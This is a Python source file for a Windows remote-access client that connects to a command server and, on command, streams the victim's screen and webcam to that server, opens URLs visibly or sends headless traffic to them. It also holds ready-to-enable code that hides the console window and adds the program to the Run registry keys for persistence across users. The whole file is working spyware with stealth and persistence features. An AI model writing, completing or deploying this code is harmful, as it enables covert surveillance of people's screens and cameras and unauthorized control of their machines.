import ctypes
import socket
import threading
import sys
import time
import requests
import webbrowser
from vidstream import ScreenShareClient, CameraClient
import cv2
import winreg
import os
import win32con

# Global variables to control the client
client = None
cam_client = None

ip_address = "192.168.1.3"


# uncomment the func below to make app run in background
# def hide_console_window():
#     hwnd = ctypes.windll.kernel32.GetConsoleWindow()
#     if hwnd != 0:
#         ctypes.windll.user32.ShowWindow(hwnd, win32con.SW_HIDE)
# hide_console_window()


def list_cameras():
    index = 0
    arr = []
    while True:
        cap = cv2.VideoCapture(index)
        if not cap.read()[0]:
            break
        else:
            arr.append(index)
        cap.release()
        index += 1
    return arr


def start_stream():
    global client
    print("Starting streaming after 5 seconds...")
    time.sleep(5)

    if not client:
        client = ScreenShareClient(ip_address, 9998)

    client.start_stream()


def start_cam():
    global cam_client
    available_cameras = list_cameras()
    if not available_cameras:
        print("No cameras available.")
        return

    print(f"Available cameras: {available_cameras}")

    time.sleep(5)
    try:
        if not cam_client:
            cam_client = CameraClient(ip_address, 9998)
        cam_client.start_stream()
    except Exception as e:
        print(f"Error creating CameraClient: {e}")
        return


def stop_stream():
    global client
    print("Stopping streaming...")

    if client:
        client.stop_stream()


def stop_cam():
    global cam_client
    print("Stopping Camera...")

    if cam_client:
        cam_client.stop_stream()


def open_url_headless(url):
    print(f"Sending traffic to {url} without opening a browser...")
    try:
        response = requests.get(url)
        print(f"Headless URL traffic response: {response.status_code}")
    except requests.RequestException as e:
        print(f"Error accessing {url}: {e}")


def open_url(url):
    print(f"Opening {url} in browser...")
    webbrowser.open(url)


def receive_commands(client_socket):
    global client

    while True:
        try:
            command = client_socket.recv(1024).decode().lower().strip()
            if not command:
                print("Server has closed the connection. Exiting...")
                break

            if command.startswith("open url headless"):
                _, url = command.split("headless", 1)
                open_url_headless(url)

            elif command.startswith("open url"):
                _, url = command.split("url", 1)
                open_url(url)

            elif command == "start stream":
                print("Executing: start stream")
                start_stream()
            elif command == "start camera":
                print("Executing: start camera")
                start_cam()

            elif command == "stop stream":
                print("Executing: stop stream")
                stop_stream()
            elif command == "stop camera":
                print("Executing: stop camera")
                stop_cam()

            else:
                print(f"Unknown command received: {command}")
                continue

        except Exception as e:
            print(f"Error receiving command: {e}")
            break


def connect_to_server(host=ip_address, port=9999):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            client_socket.connect((host, port))
            print(f"Connected to command server at {host}:{port}")
            return client_socket
        except socket.error as e:
            print(f"Couldn't connect to the server. Error: {e}. Retrying...")
            time.sleep(5)
        except KeyboardInterrupt:
            print("Client interrupted.")
            client_socket.close()
            if client:
                client.stop_stream()
            sys.exit()


def client_thread_function():
    global client
    client_socket = connect_to_server()

    command_thread = threading.Thread(target=receive_commands, args=(client_socket,))
    command_thread.start()

    try:
        command_thread.join()
    except KeyboardInterrupt:
        print("Client interrupted.")


def add_to_startup():
    try:
        exe_path = os.path.abspath(sys.argv[0])
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "MyApp", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        print("Application added to startup.")

        # Add for all users (requires admin privileges)
        reg_path_all_users = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, reg_path_all_users, 0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "MyApp", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        print("Application added to startup for all users.")
    except Exception as e:
        print(f"Failed to add application to startup: {e}")


if __name__ == "__main__":
    # Uncomment the next line to add the application to startup
    # add_to_startup()
    client_thread = threading.Thread(target=client_thread_function)
    client_thread.start()
